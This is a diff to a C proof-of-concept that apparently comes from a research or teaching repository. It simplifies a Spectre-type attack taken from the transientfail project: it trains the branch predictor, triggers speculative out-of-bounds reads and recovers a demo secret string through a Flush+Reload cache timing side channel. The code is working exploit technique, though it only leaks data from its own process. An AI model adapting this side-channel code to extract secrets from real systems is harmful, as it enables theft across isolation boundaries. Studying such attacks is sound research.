@@ -1,3 +1,15 @@
+/********************************************
+ * 项目来自  https://github.com/isec-tugraz/transientfail ，我对此进行了简化
+ * 
+ * 项目思路：使用父子进程模型：子进程持续训练分支预测器；父进程触发投机执行并通过缓存侧信道恢复数据。
+ * 
+ * 我对此比较了内联汇编写法和一般写法之间的区别
+ *
+ * 实验结果: 在 Intel和兆芯处理器上，两种写法均可成功恢复秘密数据；
+ * 
+*********************************************/
+
+
 #include <pthread.h>
 #include <stdint.h>
 #include <stdio.h>
@@ -5,6 +17,9 @@
 #include <string.h>
 #include <x86intrin.h>
 #include <unistd.h>
+#include "../utils/cache_timing.h"
+
+
 #define DATA "data|"
 #define SECRET "INACCESSIBLE SECRET"
 #define TEXT DATA SECRET
@@ -14,7 +29,6 @@ static size_t CACHE_MISS = 0;
 unsigned char array1[128];
 char *mem = NULL;
 
-void maccess(void *p) { __asm__ volatile("movq (%0), %%rax\n" : : "c"(p) : "rax"); }
 
 void cache_encode(char index)
 {
@@ -24,10 +38,10 @@ void cache_encode(char index)
 char victim(int x)
 {
     size_t len = sizeof(DATA) - 1;
-    _mm_mfence();
-    _mm_clflush(&len);
-    _mm_clflush(&x);
-    _mm_mfence();
+    mfence();
+    flush(&len);
+    flush(&x);
+    mfence();
 
     if ((float)x / (float)len < 1)
     {
@@ -43,21 +57,29 @@ void train_branch_predictor()
     }
 }
 
+
+int flush_reload(void *ptr) {
+  uint64_t start = 0, end = 0;
+  start = rdtscp();
+  maccess(ptr);
+  end = rdtscp();
+  mfence();
+  flush(ptr);
+  if (end - start < CACHE_MISS) {
+    return 1;
+  }
+  return 0;
+}
+
+
 void cache_detect(char *leaked, int index)
 {
-    unsigned int aux;
-    uint64_t start, end;
     int mix_i;
     for (int i = 0; i < 256; i++)
     {
         // 伪随机顺序访问，防止被预测
         mix_i = ((i * 167) + 13) & 255;
-        start = __rdtscp(&aux);
-        maccess(mem + mix_i * PAGE_SIZE);
-        end = __rdtscp(&aux);
-        _mm_mfence();
-        _mm_clflush(mem + mix_i * PAGE_SIZE);
-        if (end - start < CACHE_MISS)
+        if (flush_reload(mem + mix_i * PAGE_SIZE))
         {
             if ((mix_i >= 'A' && mix_i <= 'Z') && leaked[index] == ' ')
             {
@@ -66,7 +88,6 @@ void cache_detect(char *leaked, int index)
             }
         }
         fflush(stdout);
-        sched_yield();
     }
 }
 
@@ -74,61 +95,22 @@ void flush_cache()
 {
     for (int i = 0; i < 256; i++)
     {
-        _mm_clflush(mem + i * PAGE_SIZE);
+        flush(mem + i * PAGE_SIZE);
     }
 }
 
-int reload_t(void *ptr)
-{
-    unsigned int aux;
-    uint64_t start = 0, end = 0;
-    _mm_mfence();
-    start = __rdtscp(&aux);
-    maccess(ptr);
-    end = __rdtscp(&aux);
-    _mm_mfence();
-    return (int)(end - start);
-}
 
-int flush_reload_t(void *ptr)
-{
-    unsigned int aux;
-    uint64_t start = 0, end = 0;
-    _mm_mfence();
-    start = __rdtscp(&aux);
-    maccess(ptr);
-    end = __rdtscp(&aux);
-    _mm_mfence();
-    _mm_clflush(ptr);
-    return (int)(end - start);
-}
-
-size_t detect_flush_reload_threshold()
-{
-    size_t reload_time = 0, flush_reload_time = 0, i, count = 1000000;
-    size_t dummy[16];
-    size_t *ptr = dummy + 8;
-
-    maccess(ptr);
-    for (i = 0; i < count; i++)
-    {
-        reload_time += reload_t(ptr);
-    }
-    for (i = 0; i < count; i++)
-    {
-        flush_reload_time += flush_reload_t(ptr);
-    }
-    reload_time /= count;
-    flush_reload_time /= count;
-
-    return (flush_reload_time + reload_time * 2) / 3;
-}
 
 int main(int argc, const char **argv)
 {
-    if (!CACHE_MISS)
+    if (argc > 1) {
+        // 如果用户提供了参数，则使用该参数作为 CACHE_MISS
+        CACHE_MISS = (size_t)strtoul(argv[1], NULL, 0);
+    }
+
+    if (!CACHE_MISS) {
         CACHE_MISS = detect_flush_reload_threshold();
-    CACHE_MISS = CACHE_MISS < 80 ? CACHE_MISS:80; // 设置一个最小阈值
+    }
     printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);
 
     char *_mem = malloc(PAGE_SIZE * (256 + 4));
@@ -162,7 +144,7 @@ int main(int argc, const char **argv)
             victim(j);
             if (j >= sizeof(DATA) - 1)
             {
-                _mm_mfence();
+                mfence();
                 cache_detect(leaked, j);
             }
             if (!strncmp(leaked + sizeof(DATA) - 1, SECRET, sizeof(SECRET) - 1))
